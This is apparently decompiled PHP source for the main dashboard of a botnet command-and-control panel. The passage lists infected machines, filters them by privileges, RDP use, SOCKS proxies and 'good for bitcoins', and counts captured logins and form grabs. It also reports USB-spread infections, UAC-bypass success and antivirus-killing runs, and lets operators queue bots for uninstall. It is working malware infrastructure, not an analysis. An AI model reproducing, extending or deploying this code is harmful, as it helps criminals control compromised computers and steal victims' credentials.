<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "﻿\n\t";
if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
require_once "include/gateway_defines.inc";
require_once "include/gateway_functionality.inc";
$bIsMainPage = true;
$botsIndex = new CClient();
$botsIndex->SetInternalLink($main_sql_link);
$botsIndex->Status_CorrectAllOnlineStatus();
$botsIndex->Status_CorrectAllDeadStatus();
$sqlLoginsGrab = new CGrab();
$sqlFormGrab = new CFormGrab();
$sqlLoginsGrab->SetInternalLink($main_sql_link);
$sqlFormGrab->SetInternalLink($main_sql_link);
$num_forms_fields = (int) @mysql_num_rows(@$botsIndex->Query("SHOW COLUMNS FROM " . SQL_DATABASE . ".grabbed_forms"));
$num_clients_fields = (int) @mysql_num_rows(@$botsIndex->Query("SHOW COLUMNS FROM " . SQL_DATABASE . ".clients"));
$num_settings_fields = (int) @mysql_num_rows(@$botsIndex->Query("SHOW COLUMNS FROM " . SQL_DATABASE . ".settings"));
$num_grabbed_logins_fields = (int) @mysql_num_rows(@$botsIndex->Query("SHOW COLUMNS FROM " . SQL_DATABASE . ".grabbed_logins"));
$is_update_required = false;
if (0 < $num_forms_fields && $num_forms_fields != REQUIRED_GRABBED_FORMS_TABLE_COLUMNS) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "<strong>Your panel needs its database structure updated! (grabbed_forms table column count: " . $num_forms_fields . " // Expected: " . REQUIRED_GRABBED_FORMS_TABLE_COLUMNS . ")</strong> &nbsp;<a href=\"update_new.php\">Click here to update tables</a>", true, 1600);
    $is_update_required = true;
} else {
    if (0 < $num_clients_fields && $num_clients_fields != REQUIRED_CLIENTS_TABLE_COLUMNS) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "<strong>Your panel needs its database structure updated! (clients table column count: " . $num_clients_fields . " // Expected: " . REQUIRED_CLIENTS_TABLE_COLUMNS . ")</strong> &nbsp;<a href=\"update_new.php\">Click here to update tables</a>", true, 1600);
        $is_update_required = true;
    } else {
        if (0 < $num_settings_fields && $num_settings_fields != REQUIRED_SETTINGS_TABLE_COLUMNS) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "<strong>Your panel needs its database structure updated! (settings table column count: " . $num_settings_fields . " // Expected: " . REQUIRED_SETTINGS_TABLE_COLUMNS . ")</strong> &nbsp;<a href=\"update_new.php\">Click here to update tables</a>", true, 1600);
            $is_update_required = true;
        } else {
            if (0 < $num_grabbed_logins_fields && $num_grabbed_logins_fields != REQUIRED_GRABBED_LOGINS_TABLE_COLUMNS) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "<strong>Your panel needs its database structure updated! (grabbed_logins table column count: " . $num_grabbed_logins_fields . " // Expected: " . REQUIRED_GRABBED_LOGINS_TABLE_COLUMNS . ")</strong> &nbsp;<a href=\"update_new.php\">Click here to update tables</a>", true, 1600);
                $is_update_required = true;
            }
        }
    }
}
$max_per_page = 20;
$fav_max_per_page = 7;
$fav_bots = NULL;
$all_bots = NULL;
$total_num_fav_bots = 0;
$total_num_bots = 0;
$is_search = false;
$font_style = "font-size: 10px; face: font-family: Tahoma;";
if (isset($_GET["per_page"]) && is_numeric($_GET["per_page"]) && (int) $_GET["per_page"] < 100) {
    $max_per_page = (int) $_GET["per_page"];
}
if (isset($_POST["sortie_submit"]) && isset($_POST["sortie_type"]) && isset($_POST["sortie_order"]) && isset($_POST["sortie_num_per_page"])) {
    global $main_sql_link;
    $sqlAdmins = new CPanelAdmins();
    $sqlAdmins->SetInternalLink($main_sql_link);
    $_POST["sortie_type"] = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($_POST["sortie_type"]);
    $_POST["sortie_order"] = _obfuscated_0D08300701270F0205383C2F0C32021B01355B3C2C3622_($_POST["sortie_order"]);
    if ($sqlAdmins->SetUserSortOptions($Session->Get(SESSION_INFO_USERNAME), $_POST["sortie_type"], $_POST["sortie_order"], $_POST["sortie_num_per_page"])) {
        $Session->SetSessionSortParameters($_POST["sortie_type"], $_POST["sortie_order"], $_POST["sortie_num_per_page"]);
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully set new sort options", true, 1600);
    } else {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to set new sort options because of an SQL error.", true, 1600);
    }
}
$sort_by_type = $Session->Get(SESSION_INFO_SORT_TYPE);
$sort_order = $Session->Get(SESSION_INFO_SORT_TYPE_ORDER);
$tmp_max_per_page = (int) $Session->Get(SESSION_INFO_SORT_MAX_VIEW_PER_PAGE);
if ($tmp_max_per_page === 20 || $tmp_max_per_page === 40 || $tmp_max_per_page === 60) {
    $max_per_page = $tmp_max_per_page;
}
if (strlen($sort_by_type) == 0) {
    $sort_by_type = "sortie_status";
}
if (strlen($sort_order) == 0) {
    $sort_order = "asc";
}
$e_search_task_os = 0;
$e_search_mask_options = 0;
$e_search_ip = "";
$e_search_guid = "";
$e_search_countries = "";
$e_search_installdate_after = 0;
$e_search_lastcheckin_after = 0;
$pp_current_bot_view_page = (int) (isset($_GET["bots_page"]) && is_numeric($_GET["bots_page"])) ? $_GET["bots_page"] : 1;
$min_start_page = ($pp_current_bot_view_page - 1) * $max_per_page;
$pp_current_bot_fav_view_page = (int) (isset($_GET["fav_page"]) && is_numeric($_GET["fav_page"])) ? $_GET["fav_page"] : 1;
$min_start_fav_page = ($pp_current_bot_fav_view_page - 1) * $fav_max_per_page;
if (isset($_POST["exinfo_bot_id"])) {
    $exi_bot_id = (int) $_POST["exinfo_bot_id"];
    if (isset($_POST["exinfo_submit_comment"]) && isset($_POST["exinfo_comment"])) {
        $comment_text = trim($_POST["exinfo_comment"]);
        if (strlen($_POST["exinfo_comment"]) < 64) {
            if ($botsIndex->SetClient_Comment($exi_bot_id, $_POST["exinfo_comment"])) {
                if (strlen($comment_text) == 0) {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully cleared comment field for bot #" . $exi_bot_id, true, 1600);
                } else {
                    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully set new comment for bot #" . $exi_bot_id, true, 1600);
                }
            } else {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to set new comment for bot #" . $exi_bot_id . " due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
            }
        }
    }
    if (isset($_POST["exinfo_submit_favorite"])) {
        if ($botsIndex->SetClient_Favorite($exi_bot_id, true)) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully added bot #" . $exi_bot_id . " to the favorite bots list", true, 1600);
        } else {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to add bot #" . $exi_bot_id . " to the favorite bots list due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
        }
    } else {
        if (isset($_POST["exinfo_submit_unfavorite"])) {
            if ($botsIndex->SetClient_Favorite($exi_bot_id, false)) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully removed bot #" . $exi_bot_id . " from the favorite bots list", true, 1600);
            } else {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to remove bot #" . $exi_bot_id . " from the favorite bots list due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
            }
        }
    }
} else {
    if (isset($_GET["add_fav"]) && is_numeric($_GET["add_fav"])) {
        if ($botsIndex->SetClient_Favorite((int) $_GET["add_fav"], true)) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully added bot #" . htmlspecialchars($_GET["add_fav"]) . " to the favorite bots list", true, 1600);
        } else {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to add bot #" . htmlspecialchars($_GET["add_fav"]) . " to the favorite bots list due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
        }
    } else {
        if (isset($_GET["del_fav"]) && is_numeric($_GET["del_fav"])) {
            if ($botsIndex->SetClient_Favorite((int) $_GET["del_fav"], false)) {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, "Successfully removed bot #" . htmlspecialchars($_GET["add_fav"]) . " from the favorite bots list", true, 1600);
            } else {
                _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to remove bot #" . htmlspecialchars($_GET["add_fav"]) . " from the favorite bots list due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
            }
        }
    }
}
if (isset($_POST["remove_notice_submit"]) && isset($_POST["remove_notice_id"])) {
    $notice_id = (int) $_POST["remove_notice_id"];
    if (!$sqlDefault->Query("DELETE FROM " . $sqlDefault->pdbname . ".notices WHERE id = " . $notice_id . " AND notice_options & " . NOTICE_OPTION_ALLOW_REMOVE . " LIMIT 1")) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete notice #" . $notice_id . " due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
    }
}
if (isset($_GET["delete_bot"]) && is_numeric($_GET["delete_bot"]) && (int) $Session->Rights() & USER_PRIVILEGES_CMD_UNINSTALL) {
    if ($botsIndex->SetClientAsDeleted((int) $_GET["delete_bot"])) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_SUCCESS, (int) $_GET["delete_bot"] . " " . "marked as deleted. Will uninstall next time it contacts the server.", true, 1600);
    } else {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to mark bot as deleted.", true, 1600);
    }
}
if (isset($_GET["sb_submit"]) && isset($_GET["soo_systems"])) {
    $is_search = true;
    $is_search_ok = true;
    $so_err_notice = "";
    $so_ip_long = 0;
    $count_query_string = "";
    $query_string = "SELECT * FROM " . SQL_DATABASE . ".clients WHERE";
    $query_org_length = strlen($query_string);
    if (isset($_GET["so_ip"]) && 0 < strlen($_GET["so_ip"])) {
        if (($so_ip_long = (int) ip2long($_GET["so_ip"])) == 0) {
            $is_search_ok = false;
            $so_err_notice = "The IP you attempted to search is not valid. Please provide only one (1) valid IPv4 address and try again.";
        } else {
            $e_search_ip = $_GET["so_ip"];
        }
    }
    if (isset($_GET["so_guid"]) && 0 < strlen($_GET["so_guid"])) {
        if (strlen($_GET["so_guid"]) == 0 || !ctype_alnum($_GET["so_guid"])) {
            $is_search_ok = false;
            $so_err_notice = "The GUID you attempted to search is not valid. Please provide only one (1) valid 32-character GUID and try again.";
        } else {
            $e_search_guid = $_GET["so_guid"];
        }
    }
    if (isset($_GET["so_online"])) {
        $query_string .= " ClientStatus = '" . BOT_STATUS_ONLINE . "' AND";
    }
    if (isset($_GET["so_dotnet"])) {
        $e_search_mask_options = BOT_ATTRIBUTE_HAS_NET_FRAMEWORK;
    }
    if (isset($_GET["so_rdp"])) {
        $e_search_mask_options |= BOT_ATTRIBUTE_HAS_USED_RDP;
    }
    if (isset($_GET["so_admin"])) {
        $e_search_mask_options |= BOT_ATTRIBUTE_IS_ELEVATED;
    }
    if (isset($_GET["so_bitcoin"])) {
        $e_search_mask_options |= BOT_ATTRIBUTE_IS_GOOD_FOR_BITCOINS;
    }
    if ($e_search_mask_options != 0) {
        $query_string .= " ClientAttributes & " . $e_search_mask_options . " AND";
    }
    if (isset($_GET["so_comment"])) {
        $query_string .= " CHAR_LENGTH(Comments) > 0 AND";
    }
    if (isset($_GET["so_socks4"])) {
        $query_string .= " SocksPort > 0 AND";
    }
    if (isset($_GET["so_installdate"])) {
        $e_search_installdate_after = (int) strtotime($_GET["so_installdate"]);
        if ((int) $e_search_installdate_after != 0) {
            $query_string .= " FirstCheckIn >= " . sprintf("%u", $e_search_installdate_after) . " AND";
        }
    }
    if (isset($_GET["so_lastcheckindate"])) {
        $e_search_lastcheckin_after = (int) strtotime($_GET["so_lastcheckindate"]);
        if ((int) $e_search_lastcheckin_after != 0) {
            $query_string .= " LastCheckIn >= " . sprintf("%u", $e_search_lastcheckin_after) . " AND";
        }
    }
    $post_os_selections = $_GET["soo_systems"];
    foreach ($post_os_selections as $post_os_option) {
        if ($post_os_option == "all") {
            $e_search_task_os = TASK_FILTER_OS_ALL;
            break;
        }
        if ($post_os_option == "w8") {
            $e_search_task_os |= WINDOWS_VERSION_W8;
        } else {
            if ($post_os_option == "w7") {
                $e_search_task_os |= WINDOWS_VERSION_W7;
            } else {
                if ($post_os_option == "wv") {
                    $e_search_task_os |= WINDOWS_VERSION_VS;
                } else {
                    if ($post_os_option == "wxp") {
                        $e_search_task_os |= WINDOWS_VERSION_XP;
                    } else {
                        if ($post_os_option == "ws08") {
                            $e_search_task_os |= WINDOWS_VERSION_S2008 | WINDOWS_VERSION_S2008R2;
                        } else {
                            if ($post_os_option == "ws03") {
                                $e_search_task_os |= WINDOWS_VERSION_S2003;
                            }
                        }
                    }
                }
            }
        }
    }
    if ($e_search_task_os != TASK_FILTER_OS_ALL) {
        $query_string .= " OS & " . $e_search_task_os . " AND";
    }
    if (isset($_GET["so_cn"]) && 2 <= strlen($_GET["so_cn"])) {
        $e_search_countries_test = $_GET["so_cn"];
        $e_search_countries_test = str_replace(",", "", $e_search_countries_test);
        $e_search_countries_test = str_replace(" ", "", $e_search_countries_test);
        if (strlen($e_search_countries_test) < 2 || !ctype_alnum($e_search_countries_test)) {
            $so_err_notice = "Invalid countries provided in search terms. Please only use 2-letter TLD's";
        } else {
            $countries = explode(",", $_GET["so_cn"]);
            $e_search_countries = $_GET["so_cn"];
            if (count($countries) < 13) {
                foreach ($countries as $indv_country) {
                    $indv_country = trim($indv_country);
                    if (strlen($indv_country) == 2) {
                        $query_string .= " Locale = '" . $indv_country . "' AND";
                    }
                }
            } else {
                $so_err_notice = "Maximum of 12 countries per search.";
            }
        }
    }
    if (strlen($e_search_guid)) {
        $query_string .= " GUID = UNHEX('" . $e_search_guid . "') AND";
    }
    $query_len = strlen($query_string);
    if ($query_len != $query_org_length) {
        if (@substr($query_string, $query_len - 3, 3) == "AND") {
            $query_string = @substr($query_string, 0, $query_len - 3);
        }
        if (@substr($query_string, $query_len - 2, 2) == "OR") {
            $query_string = @substr($query_string, 0, $query_len - 2);
        }
        if (@substr($query_string, $query_len - 5, 5) == "WHERE") {
            $query_string = @substr($query_string, 0, $query_len - 5);
        }
    }
    if ((int) $so_ip_long != 0) {
        $unsigned_ip_string = @sprintf("%u", $so_ip_long);
        if ($query_org_length < strlen($query_string)) {
            $query_string .= " AND";
        }
        $query_string .= " LastIP = '" . $unsigned_ip_string . "'";
    }
    $count_query_string = str_replace("SELECT *", "SELECT COUNT(id)", $query_string);
    $query_string .= " LIMIT " . $min_start_page . ", " . $max_per_page;
    if ($is_search_ok == true) {
        list($total_num_bots) = @mysql_fetch_row(@$botsIndex->Query($count_query_string));
        $all_bots = $botsIndex->Query($query_string);
    } else {
        if (strlen($so_err_notice)) {
            _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, $so_err_notice, true, 1200);
        }
    }
} else {
    $fav_bots = $botsIndex->GetFavoriteClientsRangeEx($min_start_fav_page, $fav_max_per_page, $sort_by_type, $sort_order);
    if ($fav_bots) {
        $total_num_fav_bots = (int) @mysql_num_rows($fav_bots);
    }
    $all_bots = $botsIndex->GetClientsRangeEx($min_start_page, $max_per_page, $sort_by_type, $sort_order);
    if ($all_bots) {
        $total_num_bots = (int) @mysql_num_rows($all_bots);
    }
}
$iTotalNoticeCount = 0;
$all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
if (!isset($bIsMainPage) && $bIsMainPage == false) {
    $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices WHERE notice_options & " . NOTICE_OPTION_DISPLAY_IMPORTANT_PAGES . " LIMIT 4");
} else {
    if (isset($bIsMainPage) && $bIsMainPage == true) {
        $all_notices = $sqlDefault->Query("SELECT * FROM " . $sqlDefault->pdbname . ".notices LIMIT 4");
    }
}
$iTotalNoticeCount = @mysql_num_rows($all_notices);
if ($all_notices && 0 < $iTotalNoticeCount) {
    $iNoticeCount = 0;
    while (($current_row = @mysql_fetch_assoc($all_notices)) && $iNoticeCount < 3) {
        if (strtolower($Session->Get(SESSION_INFO_USERNAME)) === strtolower($current_row["notice_target"]) || strlen($current_row["notice_target"]) == 0) {
            $iType = NOTICE_TYPE_INFO;
            if ((int) $current_row["notice_options"] & NOTICE_OPTION_VIEW_AS_RED) {
                $iType = NOTICE_TYPE_ERROR;
            }
            if (@strlen($current_row["notice_author"]) && @strlen($current_row["notice_content"])) {
                $notice_real_text = "<strong>Notice #" . ($iNoticeCount + 1) . " from <i>" . @htmlspecialchars($current_row["notice_author"]) . "</i>:</strong><br />" . @str_replace("\r\n", "<br />", @htmlspecialchars($current_row["notice_content"]));
                $notice_real_text .= "<br />";
                if ((int) $current_row["notice_options"] & NOTICE_OPTION_ALLOW_REMOVE) {
                    $notice_real_text .= "<br />";
                    $notice_real_text .= "<form style=\"display:inline;\" method=\"post\" action=\"" . $_SERVER["REQUEST_URI"] . "\">";
                    $notice_real_text .= "<input type=\"hidden\" name=\"remove_notice_id\" value=\"" . $current_row["id"] . "\">";
                    $notice_real_text .= "<input type=\"submit\" class=\"btn\" name=\"remove_notice_submit\" value=\"Remove notice\">";
                    $notice_real_text .= "</form>";
                }
                _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, $notice_real_text, 1600);
                $iNoticeCount++;
            }
        }
    }
    if ($iNoticeCount == 3 && 4 <= $iTotalNoticeCount) {
        _obfuscated_0D292E0A2F3613041D323B1036055B262D0E2928223232_($iType, "There appears to be more than 3 notices! Please check the <a href=\"?mod=" . MOD_SETTINGS_ALERTS . "\">notices page</a> for additional notices.", 1600);
    }
}
if ($is_update_required == false && (is_readable("./setup.php") || is_readable("./setup.sql") || is_readable("./update.php"))) {
    _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "setup.php, setup.sql or update.php still appear to exist in root directory. Please delete these setup files immediately.", true, 1600);
}
echo "\t\n\t";
if ($total_num_bots == 0 || !((int) $Session->Rights() & USER_PRIVILEGES_VIEW_BOT_INFO)) {
    echo "<div class=\"container\"><div id=\"blah2\" class=\"modal hide fade in\" style=\"display: none;  width: 850px; margin: -260px 0 0 -410px;\"><div class=\"modal-header\"></div><div class=\"modal-body\"></div></div></div>";
} else {
    while ($current_row = @mysql_fetch_assoc($all_bots)) {
        _obfuscated_0D372D021030251829183340120E2E15290E142C041D22_($current_row);
    }
    @mysql_data_seek($all_bots, 0);
}
echo "\n<table align=\"center\">\n        <thead>\n          <tr>\n            <th width=\"20%\"></th>\n            <th width=\"80%\"></th>\n          </tr>\n        </thead>\n        <tbody>\n\t\t<tr>\n            <td valign=\"top\">\n\n\t\t\t\t<font size=\"1\" face=\"Tahoma\">\n\t\t\t\t<table class=\"table-bordered table-condensed\" align=\"left\" style=\"width: 310px;\">\n\t\t\t\t\t\t<thead>\n\t\t\t\t\t\t  <tr>\n\t\t\t\t\t\t\t<th width=\"220\"></th>\n\t\t\t\t\t\t  </tr>\n\t\t\t\t\t\t</thead>\n\t\t\t\t\t\t<tbody>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t\t";
$gate_status_string = "Enabled";
$gate_status_string_color = "#339900";
if ($sqlSettings->Flags_Security & SECURITY_FLAGS_PANEL_GATEWAY_DISABLED) {
    $gate_status_string = "Disabled";
    $gate_status_string_color = "#E80000";
}
$failed_logins = (int) $sqlSettings->FailedLogins;
$failedlogins_string_color = "";
if (0 < $failed_logins) {
    $failedlogins_string_color = "#E80000";
}
_obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("General statistics", 10, "top: -3px;", "");
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Name", $sqlSettings->Name);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Created", date("m/d/Y", $sqlSettings->Created));
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Version", $sqlSettings->Version);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Failed login attempts", $failed_logins, $failedlogins_string_color);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Active tasks", $sqlTasks->GetActiveTasksCount());
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Gate status", $gate_status_string, $gate_status_string_color);
_obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t<td>\n\t\t\t\t\t\n\t\t\t\t\t\t\t\t";
$stats_total_bots = $botsIndex->Stats_GetTotalBots();
$stats_total_bots_edead = $botsIndex->Stats_GetTotalBotsEvenDead();
$stats_total_usb_bots = $botsIndex->Stats_GetTotalBotsFromUsb();
$stats_total_fav_bots = $botsIndex->Stats_GetTotalFavoriteBots();
$stats_duplicates = $botsIndex->Stats_GetLikelyDuplicateBotCount();
$bUseMinStats = false;
$Num_Online = 0;
$Num_Online_3h = 0;
$Num_Online_24h = 0;
$Num_Online_2d = 0;
$Num_Online_3d = 0;
$Num_Online_4d = 0;
$Num_Online_5d = 0;
$Num_Online_7d = 0;
$Num_New_24h = 0;
$Num_New_USB_24h = 0;
$Num_Offline = 0;
$Num_Dead = 0;
$Num_DotNet = 0;
$Num_Java = 0;
$Num_Phones = 0;
$Num_Admin = 0;
$Num_TricksNeeded = 0;
$Num_TricksWorked = 0;
$Num_AVKill_Executed = 0;
$Num_BotsVersion1806_up = $botsIndex->GetClientsVer1806AndUp(true);
$Num_Windows10 = 0;
$Num_Windows81 = 0;
$Num_Windows8 = 0;
$Num_Windows7 = 0;
$Num_Windows_Vista = 0;
$Num_Windows_XP = 0;
$Num_Windows_Server_2008 = 0;
$Num_Windows_Server_2003 = 0;
$Num_Windows_Unknown = 0;
$Num_Windows_x86 = 0;
$Num_Windows_x64 = 0;
if ($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS) {
    $bUseMinStats = true;
}
$botsIndex->Stats_GetOS($Num_Windows10, $Num_Windows81, $Num_Windows8, $Num_Windows7, $Num_Windows_Vista, $Num_Windows_XP, $Num_Windows_Server_2008, $Num_Windows_Server_2003, $Num_Windows_Unknown, $Num_Windows_x86, $Num_Windows_x64, $bUseMinStats, "", BOT_STATUS_NO_STATUS_SPECIFIED, STATS_INTEGER_FIELD_OPERATOR_LESS_THAN);
$botsIndex->Stats_GetComponents($Num_DotNet, $Num_Java, $Num_Phones, $Num_Admin, $Num_TricksNeeded, $Num_TricksWorked, $Num_AVKill_Executed, $bUseMinStats, "", BOT_STATUS_NO_STATUS_SPECIFIED, STATS_INTEGER_FIELD_OPERATOR_LESS_THAN);
$botsIndex->Stats_GetOnlineInfo($Num_Online, $Num_Online_3h, $Num_Online_24h, $Num_Online_2d, $Num_Online_3d, $Num_Online_4d, $Num_Online_5d, $Num_Online_7d, $Num_New_24h, $Num_New_USB_24h, $Num_Offline, $Num_Dead, $bUseMinStats);
_obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Connections", 10, "top: -3px;", "");
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total unique groups", $botsIndex->Stats_GetTotalGroups());
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total bots", $stats_total_bots);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Total bots from USB", $stats_total_usb_bots);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online", $Num_Online);
if ($bUseMinStats == false) {
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online (Past 3h)", $Num_Online_3h);
}
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online (Past 24h)", $Num_Online_24h);
if ($bUseMinStats == false) {
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online (Past 3 days)", $Num_Online_3d);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online (Past 5 days)", $Num_Online_5d);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots online (Past 7 days)", $Num_Online_7d);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("New bots (Past 24h)", $Num_New_24h);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("New bots from USB (Past 24h)", $Num_New_USB_24h);
}
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots offline", $Num_Offline);
_obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Bots dead", $Num_Dead);
if ($bUseMinStats == false) {
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Possible duplicate entries", $stats_duplicates);
}
_obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
echo "\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t\t";
if (!($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS)) {
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Components", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_(".NET Framework", $Num_DotNet . " / " . $stats_total_bots);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Had phone/tablet connected", $Num_Phones . " / " . $stats_total_bots);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Has Admin. Rights", $Num_Admin . " / " . $stats_total_bots);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("UAC Mitigate Success rate", $Num_TricksWorked . " / " . $Num_TricksNeeded);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("AVKill Executed", $Num_AVKill_Executed . " / " . $Num_BotsVersion1806_up);
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
}
echo "\t\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t\t";
if (!($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS)) {
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Logs", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Form captures to date", $sqlFormGrab->Stats_GetTotalForms());
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Login captures to date", $sqlLoginsGrab->Stats_GetTotalLogins());
    _obfuscated_0D152C300D16140F2C371E291D062F020D071537162F01_();
}
echo "\t\t\t\t\t\t\t\t</td>\n\t\t\t\t\t\t</tr>\n\t\t\t\t\t\t<tr>\n\t\t\t\t\t\t\t\t<td>\n\t\t\t\t\t\t\t\t<!-- General statistics alignment table -->\n\t\t\t\t\t\t\t\t";
if (!($sqlSettings->General_Options & GENERAL_OPTION_MAIN_PAGE_VIEW_MINIMUM_STATS)) {
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Operating Systems", 10, "top: -3px;", "");
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows 10", $Num_Windows10);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows 8.1", $Num_Windows81);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows 8 (All versions)", $Num_Windows8);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows 7", $Num_Windows7);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows Vista", $Num_Windows_Vista);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows XP", $Num_Windows_XP);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows Server 2008", $Num_Windows_Server_2008);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("Windows Server 2003", $Num_Windows_Server_2003);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("32 Bit (x86)", $Num_Windows_x86);
    _obfuscated_0D111F0934345B27321F0E3C0C073D39381D292E3F3C11_("64 Bit (x86-64)", $Num_Windows_x64);
